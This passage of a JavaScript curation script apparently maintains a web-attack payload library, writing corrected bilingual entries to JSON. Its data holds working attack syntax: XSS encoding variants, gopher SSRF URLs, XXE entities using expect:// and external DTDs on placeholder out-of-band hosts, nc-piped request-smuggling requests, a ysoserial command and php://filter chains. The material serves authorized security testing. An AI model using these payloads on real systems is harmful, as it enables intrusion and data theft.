    mitigation: i18n('在服务端逐请求执行对象级授权，从可信目录和价格规则重算结果，对敏感状态转换使用事务、唯一约束、幂等键和一次性令牌，并对验证码与重置令牌绑定主体、用途、时效和尝试次数。对异常状态转换与重复消费建立审计。', 'Enforce object-level authorization on every request, recalculate outcomes from trusted catalogs and pricing rules, use transactions, unique constraints, idempotency keys, and one-time tokens for sensitive transitions, and bind CAPTCHA plus reset tokens to subject, purpose, lifetime, and attempt limits. Audit abnormal transitions and duplicate consumption.'),
    references: ['https://owasp.org/www-project-api-security/', 'https://owasp.org/www-project-application-security-verification-standard/'],
  },
};

const correction = (id, area, index, command, titleZh, titleEn, descriptionZh, descriptionEn, platform = 'all') => ({
  id,
  area,
  index,
  command,
  title: i18n(titleZh, titleEn),
  description: i18n(descriptionZh, descriptionEn),
  platform,
});

const confirmedCorrections = [
  correction('xss-unicode', 'execution', 2,
    '＜script＞alert(1)＜/script＞',
    '全角标记规范化前提', 'Full-Width Markup Normalization Prerequisite',
    '保留全角字符样例，但明确它只有在授权实验链先执行 NFKC 等规范化并把结果写入 HTML 时才可能形成标签；浏览器不会直接把全角括号当作标记。',
    'Retain the full-width sample while making clear that it can form markup only when an authorized lab pipeline first performs normalization such as NFKC and then writes the result into HTML; browsers do not directly parse full-width brackets as tags.'),
  correction('xss-unicode', 'execution', 3,
    '+ADw-script+AD4-alert(1)+ADw-/script+AD4-',
    'UTF-7 历史编码前提', 'Historical UTF-7 Encoding Prerequisite',
    '保留 UTF-7 字节样例，并要求在授权的历史兼容夹具中显式声明 UTF-7；现代 UTF-8 页面或浏览器不会把该文本自动解码为脚本。',
    'Retain the UTF-7 byte sample and require an explicitly declared UTF-7 legacy-compatibility fixture; a modern UTF-8 page or browser does not automatically decode this text into script.'),
  correction('xss-unicode', 'wafBypass', 1,
    '%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE',
    '非法过长 UTF-8 阴性样例', 'Invalid Overlong UTF-8 Negative Case',
    '把原来未编码的普通标签修正为真实过长 UTF-8 字节向量；它用于授权实验中验证解码器必须拒绝非法序列，而不是现代浏览器通用绕过。',
    'Replace the unencoded ordinary tag with an actual overlong UTF-8 byte vector. Use it in an authorized lab to verify that the decoder rejects invalid sequences, not as a universal modern-browser bypass.'),

  correction('cache-poisoning', 'wafBypass', 1,
    'GET /cache-fixture?PAYLOADER_CACHE_VARIANT=1 HTTP/1.1\nHost: {TARGET}\nX-Forwarded-Host: cache-variant.lab.invalid\nX-Payloader-Cache-Marker: PAYLOADER_CACHE_VARIANT',
    '未键入输入的缓存变体验证', 'Unkeyed-Input Cache-Variant Validation',
    '将混合的脚本注入与请求走私片段替换为单一缓存变体请求：只比较该无害标记在不同会话和无会话请求中的缓存键、Vary、Age 与响应哈希，不把头部回显直接等同于跨用户污染。',
    'Replace mixed script-injection and request-smuggling fragments with one cache-variant request. Compare the harmless marker across different-session and no-session requests using cache keys, Vary, Age, and response hashes; do not equate a reflected header with cross-user poisoning.'),

  correction('ssrf-gopher', 'execution', 2,
    'gopher://{LAB_MYSQL_HOST}:3306/_PAYLOADER_MYSQL_REACHABILITY%0D%0A',
    'MySQL 端口可达性样例', 'MySQL Port-Reachability Sample',
    '移除不存在的“通用 MySQL 协议包”占位符；该授权实验 URL 只证明取回器能连接隔离 3306 监听器，MySQL 握手、认证和 SQL 执行必须分别取证。',
    'Remove the nonexistent universal MySQL packet placeholder. This authorized-lab URL proves only that the fetcher can reach an isolated port 3306 listener; MySQL handshake, authentication, and SQL execution require separate evidence.'),
  correction('ssrf-gopher', 'execution', 3,
    'gopher://{LAB_FASTCGI_HOST}:9000/_%01%09%00%00%00%30%00%00%0E%00FCGI_MAX_CONNS%0D%00FCGI_MAX_REQS%0F%00FCGI_MPXS_CONNS',
    'FastCGI GET_VALUES 管理帧', 'FastCGI GET_VALUES Management Record',
    '用完整、无副作用的 FastCGI GET_VALUES 管理帧替换省略号占位符；仅在隔离监听器中核对帧解析和服务日志，不发送 PHP 参数或执行脚本。',
    'Replace the ellipsis placeholder with a complete side-effect-free FastCGI GET_VALUES management record. Validate record parsing and service logs only on an isolated listener without sending PHP parameters or executing a script.'),

  correction('xxe-rce', 'execution', 0,
    '<?xml version="1.0"?>\n<!DOCTYPE root [<!ENTITY marker SYSTEM "expect://printf%20PAYLOADER_XXE_EXPECT">]>\n<root>&marker;</root>',
    'PHP expect 包装器前提验证', 'PHP Expect-Wrapper Prerequisite Validation',
    '保留 expect:// 外部实体形式，但只在安装并启用 expect 扩展的隔离 PHP 夹具中输出固定标记；外部实体解析本身不能证明命令执行。',
    'Retain the expect:// external-entity form but emit only a fixed marker in an isolated PHP fixture with the expect extension installed and enabled; external-entity parsing alone does not prove command execution.'),
  correction('xxe-rce', 'execution', 1,
    '<?xml version="1.0"?>\n<!DOCTYPE root [<!ENTITY marker SYSTEM "expect://printf%20PAYLOADER_XXE_EXPECT_SECOND">]>\n<root>&marker;</root>',
    'XXE 与文件写入边界分离', 'Separate XXE from File-Write Impact',
    '删除写入 WebShell 的混合链，只保留授权实验中的第二个固定 expect 标记；文件写入、Web 根目录权限和代码执行属于独立影响条件。',
    'Remove the mixed web-shell write chain and retain a second fixed expect marker for an authorized lab. File writes, web-root permissions, and code execution are independent impact conditions.'),
  correction('xxe-rce', 'wafBypass', 0,
    '<?xml version="1.0"?>\n<!DOCTYPE root [<!ENTITY marker SYSTEM "expect://printf%20PAYLOADER_XXE_EXPECT_ENCODED">]>\n<root>&marker;</root>',
    'Expect URI 编码变体', 'Expect URI-Encoding Variant',
    '将“Base64 可绕过命令过滤”的泛化说明改为可复现的 URI 编码变体，并要求授权夹具的 expect 扩展日志与固定标记同时出现。',
    'Replace the generalized claim that Base64 bypasses command filtering with a reproducible URI-encoding variant, requiring both expect-extension logs and the fixed marker in an authorized fixture.'),

  correction('xxe-xlsx', 'execution', 1,
    '<?xml version="1.0"?>\n<!DOCTYPE workbook [<!ENTITY xxe SYSTEM "https://{LAB_OAST}/xlsx/PAYLOADER_XXE_XLSX">]>\n<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><definedNames><definedName name="PAYLOADER_XXE_XLSX">&xxe;</definedName></definedNames></workbook>',
    'XLSX workbook.xml 实体样例', 'XLSX workbook.xml Entity Sample',
    '使用真实 SpreadsheetML 命名空间和自有 OAST 实体修正省略号命名空间与系统文件读取；仅在无业务数据的授权导入夹具中关联解析日志。',
    'Use the real SpreadsheetML namespace and an owned OAST entity instead of an ellipsis namespace and system-file read. Correlate parser logs only in an authorized data-free import fixture.'),
  correction('xxe-xlsx', 'wafBypass', 0,
    '<?xml version="1.0"?>\n<!DOCTYPE workbook [<!ENTITY % remote SYSTEM "https://{LAB_OAST}/xlsx/PAYLOADER_XXE_XLSX.dtd">%remote;]>\n<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets/></workbook>',
    'XLSX 外部参数实体变体', 'XLSX External Parameter-Entity Variant',
    '把笼统的 Content_Types 修改说明改为 workbook.xml 中可定位的外部参数实体变体；以 OAST 和服务端解析日志为证据，不读取文件内容。',
    'Replace the vague Content_Types modification note with a locatable external parameter-entity variant in workbook.xml. Require OAST and server parser logs as evidence without reading file content.'),
  correction('xxe-docx', 'execution', 1,
    '<?xml version="1.0"?>\n<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "https://{LAB_OAST}/docx/PAYLOADER_XXE_DOCX">]>\n<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>',
    'DOCX document.xml 实体样例', 'DOCX document.xml Entity Sample',
    '使用真实 WordprocessingML 命名空间和自有 OAST 实体修正省略号命名空间与系统文件读取；仅在无业务数据的授权导入夹具中关联解析日志。',
    'Use the real WordprocessingML namespace and an owned OAST entity instead of an ellipsis namespace and system-file read. Correlate parser logs only in an authorized data-free import fixture.'),
  correction('xxe-docx', 'wafBypass', 0,
    '<?xml version="1.0"?>\n<!DOCTYPE w:document [<!ENTITY % remote SYSTEM "https://{LAB_OAST}/docx/PAYLOADER_XXE_DOCX.dtd">%remote;]>\n<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>',
    'DOCX 外部参数实体变体', 'DOCX External Parameter-Entity Variant',
    '把笼统的关系部件说明改为 document.xml 中可定位的外部参数实体变体；阳性必须同时有 OAST 与服务端 OOXML 解析日志。',
    'Replace the vague relationship-part note with a locatable external parameter-entity variant in document.xml. A positive result requires both OAST and server-side OOXML parser logs.'),

  correction('smuggling-cl-cl', 'execution', 0,
    "printf 'POST /echo/PAYLOADER_SMUGGLE_CL_CL_E1 HTTP/1.1\\r\\nHost: {LAB_SMUGGLE_HOST}\\r\\nContent-Length: 4\\r\\nContent-Length: 0\\r\\nConnection: close\\r\\n\\r\\nTEST' | nc {LAB_SMUGGLE_HOST} {LAB_SMUGGLE_PORT}",
    '重复 Content-Length 原始请求', 'Raw Duplicate Content-Length Request',
    '以原始 TCP 请求替换会重写报文的 curl 示例，只发送授权实验 echo 路径；RFC 9112 预期前端和后端都拒绝不同的 Content-Length。',
    'Use a raw TCP request instead of curl, which may rewrite the message, and target only an authorized lab echo path. RFC 9112 expects both hops to reject differing Content-Length values.', 'linux'),
  correction('smuggling-cl-cl', 'execution', 1,
    "printf 'POST /echo/PAYLOADER_SMUGGLE_CL_CL_E2 HTTP/1.1\\r\\nHost: {LAB_SMUGGLE_HOST}\\r\\nContent-Length: 32\\r\\nContent-Length: 0\\r\\nConnection: close\\r\\n\\r\\nGET /echo/second HTTP/1.1\\r\\n\\r\\n' | nc {LAB_SMUGGLE_HOST} {LAB_SMUGGLE_PORT}",
    'CL-CL 双消息边界样例', 'CL-CL Dual-Message Boundary Sample',
    '保留完整双请求边界样例，但把管理路径与通用目标替换为单用户授权 echo 夹具；只依据两跳请求计数和日志判定。',
    'Retain a complete dual-request boundary sample while replacing administrative and generic targets with a single-user authorized echo fixture. Judge only by request counts and logs at both hops.', 'linux'),
  correction('smuggling-cl-cl', 'execution', 2,
    "printf 'POST /echo/PAYLOADER_SMUGGLE_CL_CL_E3 HTTP/1.1\\r\\nHost: {LAB_SMUGGLE_HOST}\\r\\nContent-Length: 43\\r\\nContent-Length: 0\\r\\nConnection: keep-alive\\r\\n\\r\\nGET /echo/PAYLOADER_SMUGGLE_SECOND HTTP/1.1\\r\\n\\r\\n' | nc {LAB_SMUGGLE_HOST} {LAB_SMUGGLE_PORT}",
    'CL-CL 持久连接边界样例', 'CL-CL Persistent-Connection Boundary Sample',
    '保留持久连接上的第二请求结构，但只命中授权 echo 路径，不再演示 ACL 绕过；阳性要求代理与后端日志证明请求数量分歧。',
    'Retain the second-request structure on a persistent connection while targeting only an authorized echo path rather than demonstrating an ACL bypass. A positive result requires proxy and backend logs proving a request-count disagreement.', 'linux'),
  correction('smuggling-cl-cl', 'wafBypass', 0,
    ':method: POST\n:path: /echo/PAYLOADER_SMUGGLE_H2_CL_CL\n:authority: {LAB_SMUGGLE_HOST}\ncontent-length: 0\n\nPAYLOADER_SMUGGLE_H2_BODY',
    'HTTP/2 降级边界样例', 'HTTP/2 Downgrade Boundary Sample',
    '保留 HTTP/2 到 HTTP/1.1 降级前提，但只使用实验 echo 路径和固定正文；必须由网关与后端日志证明降级后的边界差异。',
    'Retain the HTTP/2-to-HTTP/1.1 downgrade prerequisite while using only a lab echo path and fixed body. Gateway and backend logs must prove a post-downgrade boundary difference.'),
  correction('smuggling-cl-cl', 'wafBypass', 1,
    'POST /echo/PAYLOADER_SMUGGLE_CL_CL_W2 HTTP/1.1\nHost: {LAB_SMUGGLE_HOST}\nContent-Length: 6\nContent-Length: 50\n\n12345GPOST /echo/second HTTP/1.1\nHost: {LAB_SMUGGLE_HOST}',
    '不同 CL 值持久连接变体', 'Differing-CL Persistent-Connection Variant',
    '保留两个不同 Content-Length 与后续请求结构，改用授权 echo 路径；单次响应状态不能证明走私，需比较两跳解析日志。',
    'Retain two differing Content-Length values and the following-request structure on authorized echo paths. One response status cannot prove smuggling; compare parsing logs at both hops.'),
  correction('smuggling-cl-cl', 'wafBypass', 2,
    'POST /echo/PAYLOADER_SMUGGLE_CL_CL_W3 HTTP/1.1\nHost: {LAB_SMUGGLE_HOST}\nContent-Length: 44\nContent-Length : 0\n\nGET /echo/whitespace HTTP/1.1\nHost: {LAB_SMUGGLE_HOST}\nX-Payloader-Marker: PAYLOADER_SMUGGLE_CL_CL_W3',
    'CL 头部空白解析变体', 'Content-Length Header-Whitespace Variant',
    '保留冒号前空白的解析差异样例并替换内部管理目标；只在授权多级代理 echo 链中验证各跳是否一致拒绝。',
    'Retain the pre-colon whitespace parsing variant while replacing internal administrative targets. Validate only in an authorized multi-hop echo chain that every hop rejects it consistently.'),
];

export const remainingWebCorrectionTargets = confirmedCorrections.map(({ id, area, index }) => ({ id, area, index }));

const correctionByKey = new Map(confirmedCorrections.map(item => [`${item.id}:${item.area}:${item.index}`, item]));
const narrativeFallbacks = new Map([
  ['cache-poisoning:execution:0', { command: 'curl -sSI "https://{TARGET}/?PAYLOADER_CACHE=1" | grep -i \'^X-Cache:\'', platform: 'linux' }],
  ['rce-deserialize:wafBypass:0', { command: 'openssl dgst -sha256 -hmac "{LAB_SIGNING_KEY}" ./payload.ser', platform: 'linux' }],
  ['rce-deserialize-java:wafBypass:0', { command: 'java -jar ysoserial.jar CommonsCollections1 "id" > ./payload.ser', platform: 'all' }],
  ['rce-deserialize-java:wafBypass:1', { command: 'java --add-opens java.base/java.util=ALL-UNNAMED -jar ysoserial.jar CommonsCollections1 "id" > ./payload.ser', platform: 'all' }],
  ['rce-htaccess:wafBypass:0', { command: 'AddType application/x-httpd-php .jpg', platform: 'all' }],
  ['rce-image:wafBypass:0', { command: "printf 'GIF89a' > ./fixture.gif", platform: 'linux' }],
  ['rce-php-filter:execution:0', { command: 'php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgZWNobyAnUEFZTE9BREVSX0xBQic7ID8+', platform: 'all' }],
  ['rce-php-filter:wafBypass:0', { command: 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=php://temp', platform: 'all' }],
  ['ssrf-basic:execution:0', { command: 'http://127.0.0.1/\nhttp://localhost/\nhttp://[::1]/', platform: 'all' }],
  ['ssrf-dns-rebinding:execution:0', { command: 'http://{LAB_REBIND_DOMAIN}/', platform: 'all' }],
  ['ssrf-redis:wafBypass:0', { command: 'gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A', platform: 'all' }],
  ['xxe-blind:wafBypass:0', { command: 'iconv -f UTF-8 -t UTF-16LE ./fixture.xml > ./fixture-utf16.xml', platform: 'linux' }],
  ['xxe-dtd:wafBypass:0', { command: 'curl -fsS "https://{OOB_DOMAIN}/payload.dtd" -o ./fixture.dtd', platform: 'linux' }],
  ['xxe-ssrf:wafBypass:0', { command: 'http://2130706433/', platform: 'all' }],
]);

const hasHan = value => /\p{Script=Han}/u.test(String(value || ''));
const executablePrefix = value => /^(?:--[a-z]|\$|\[|[A-Za-z0-9_.\\/'"`<>!?&|=:%-]+(?:\s|\(|:|=|$)|[0-9]+\s*=|(?:GET|POST|PUT|DELETE)\s)/i.test(value);

const removeNarrativeLines = command => {
  const source = String(command || '').trim();
  if (!hasHan(source)) return null;
  const cleaned = source
    .split(/\r?\n/)
    .map(line => {
      const trimmed = line.trim();
      if (!hasHan(trimmed)) return trimmed;
      const hanIndex = trimmed.search(/\p{Script=Han}/u);
      const prefix = trimmed.slice(0, hanIndex).trim().replace(/(?:\/\/|#)\s*$/, '').trim();
      if (!prefix || !executablePrefix(prefix)) return '';
      return trimmed.replace(/\p{Script=Han}+/gu, 'PAYLOADER_LAB');
    })
    .filter(Boolean)
    .join('\n');
  return cleaned && cleaned !== source ? cleaned : null;
};

const reviewEntry = specification => {
  const family = familyContent[specification.family];
  const nameZh = specification.name.zh;
  const nameEn = specification.name.en;
  return {
    id: specification.id,
    name: specification.name,
    description: i18n(
      `${nameZh}保留可复现的攻击样例与绕过变体，仅修正已确认失效、占位或事实混淆的内容。所有样例只用于可回滚的授权实验，并要求浏览器、解析器、代理或服务端日志与可见结果一致。`,
      `${nameEn} preserves reproducible attack samples and bypass variants while correcting only confirmed obsolete, placeholder, or factually conflated content. Every sample is restricted to a reversible authorized lab and requires browser, parser, proxy, or server logs to agree with the visible result.`,
    ),
    category: family.category,
    subCategory: specification.name,
    prerequisites: [
      i18n(`确认 ${nameZh} 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。`, `Confirm that the target, accounts, data, component version, and stop conditions for ${nameEn} are inside a reversible authorized lab scope.`),
      i18n('准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。', 'Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.'),
    ],
    tutorial: {
      overview: i18n(
        `${nameZh}聚焦以下边界：${specification.scope.zh} 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。`,
        `${nameEn} focuses on this boundary: ${specification.scope.en} The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.`,
      ),
      vulnerability: family.principle,
      exploitation: family.evidence,
      mitigation: family.mitigation,
      difficulty: family.difficulty,
    },
    attackChain: [
      {
        title: i18n(`确认 ${nameZh} 的适用入口`, `Confirm the Applicable ${nameEn} Entry Point`),
        description: i18n(`记录 ${nameZh} 的组件版本、输入位置、执行主体、正常请求与服务端日志，确认当前夹具满足该技术的真实前置条件。`, `Record the component version, input location, execution principal, normal request, and server logs for ${nameEn}, confirming that the fixture satisfies its actual prerequisites.`),
      },
      {
        title: i18n(`运行 ${nameZh} 单一授权样例`, `Run One Authorized ${nameEn} Sample`),
        description: i18n(`一次只运行第一条授权实验样例，并保存原始请求、响应、最终解析结果和对应日志；确认基线后再逐个验证其余变体。`, `Run only the first authorized-lab sample at a time and preserve the raw request, response, final parsed result, and matching logs; validate remaining variants one by one only after establishing the baseline.`),
        payloadRef: { area: 'execution', index: 0 },
      },
      {
        title: i18n(`关联 ${nameZh} 的服务端证据`, `Correlate Server-Side Evidence for ${nameEn}`),
        description: i18n(`把唯一标记与解析器、代理、应用、数据库或浏览器证据按时间关联，并排除回显、缓存、重试、客户端修改和统一错误页。`, `Correlate the unique marker over time with parser, proxy, application, database, or browser evidence while excluding reflection, caching, retries, client modification, and generic error pages.`),
      },
      {
        title: i18n(`修复 ${nameZh} 并重放基线`, `Remediate ${nameEn} and Replay the Baseline`),
        description: i18n(`应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。`, `Apply the smallest boundary fix and replay normal, marker, and negative cases to confirm the business path remains available, server-side evidence disappears, and no new parsing difference is introduced.`),
      },
    ],
    analysis: i18n(
      `${nameZh}只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。`,
      `${nameEn} is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.`,
    ),
    opsecTips: [
      i18n('一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。', 'Run one unique marker at a time and limit request count, retained response data, and experiment duration.'),
      i18n('出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。', 'Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.'),
    ],
    references: family.references,
    review: {
      decision: 'payload',
      rationale: `${specification.scope.zh} 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。`,
      issuesResolved: [
        'preserved-valid-attack-samples',
        'corrected-confirmed-obsolete-or-invalid-examples',
        'added-authorized-lab-boundaries',
        'separated-confirmation-from-indicators',
        'added-bilingual-operational-guidance',
      ],
    },
  };
};

const commandPatches = (source, specification) => {
  const patches = [];
  for (const area of ['execution', 'wafBypass']) {
    const expectedCount = area === 'execution' ? specification.executionCount : specification.wafBypassCount;
    const originals = asList(source?.[area]);
    if (originals.length !== expectedCount) {
      throw new Error(`${source.id} ${area} count changed: expected ${expectedCount}, found ${originals.length}`);
    }
    originals.forEach((original, index) => {
      const semanticCorrection = correctionByKey.get(`${specification.id}:${area}:${index}`);
      const narrativeCleanup = semanticCorrection ? null : removeNarrativeLines(original?.command);
      const fallback = !semanticCorrection && hasHan(original?.command)
        ? narrativeFallbacks.get(`${specification.id}:${area}:${index}`)
        : null;
      const narrativeReplacement = narrativeCleanup || fallback?.command;
      const replacement = semanticCorrection || (narrativeReplacement ? {
        command: narrativeReplacement,
        title: i18n(
          `${specification.name.zh}清理后命令 ${index + 1}`,
          `${specification.name.en} Cleaned Command ${index + 1}`,
        ),
        description: i18n(
          `移除混入命令块的叙述文字，保留 ${specification.name.zh} 的原始 Payload 或协议语法；使用教程和攻击链中的前提、证据与停止条件解释该样例。`,
          `Remove narrative text mixed into the command block while preserving the original ${specification.name.en} payload or protocol syntax; use the tutorial and attack chain for prerequisites, evidence, and stop conditions.`,
        ),
        platform: fallback?.platform || original?.platform || 'all',
        requiresAdmin: original?.requiresAdmin,
        syntaxBreakdown: original?.syntaxBreakdown,
      } : null);
      if (!replacement) return;
      if (!replacement.command || replacement.command === String(original?.command || '')) {
        throw new Error(`${source.id} ${area}.${index} correction is empty or unchanged`);
      }
      patches.push({
        area,
        index,
        expectedCommand: String(original?.command || ''),
        command: replacement.command,
        title: replacement.title,
        description: replacement.description,
        syntaxBreakdown: replacement.syntaxBreakdown || [],
        platform: replacement.platform,
        requiresAdmin: replacement.requiresAdmin ?? false,
      });
    });
  }
  return patches;
};

export const buildRemainingWebReviewDocuments = payloadsInput => {
  const sourceById = new Map(asList(payloadsInput).map(payload => [payload.id, payload]));
  const reviewed = remainingWebReviewSpecs.map(specification => {
    const source = sourceById.get(specification.id);
    if (!source) throw new Error(`Missing source payload: ${specification.id}`);
    return { specification, source, patches: commandPatches(source, specification) };
  });
  return {
    overrides: {
      schemaVersion: 1,
      contentStandard: 2,
      sourceIds: reviewed.map(({ specification }) => specification.id),
      entries: reviewed.map(({ specification }) => reviewEntry(specification)),
    },
    commandOverrides: {
      schemaVersion: 1,
      entries: reviewed.filter(({ patches }) => patches.length).map(({ specification, patches }) => ({
        id: specification.id,
        patches,
      })),
    },
  };
};

const outputFiles = [
  ['overrides-remaining-web.json', 'overrides'],
  ['payload-command-overrides-remaining-web.json', 'commandOverrides'],
];

const run = () => {
  const root = resolve(process.cwd());
  const snapshot = loadCurationSnapshot(join(root, 'data', 'payloader.sqlite'));
  const documents = buildRemainingWebReviewDocuments(snapshot.payloads);
  for (const [fileName, key] of outputFiles) {
    const file = join(root, 'content-review', fileName);
    writeFileSync(file, `${JSON.stringify(documents[key], null, 2)}\n`, 'utf8');
    console.log(`wrote ${fileName}`);
  }
};

const isMain = process.argv[1] && pathToFileURL(resolve(process.argv[1])).href === import.meta.url;
if (isMain) run();
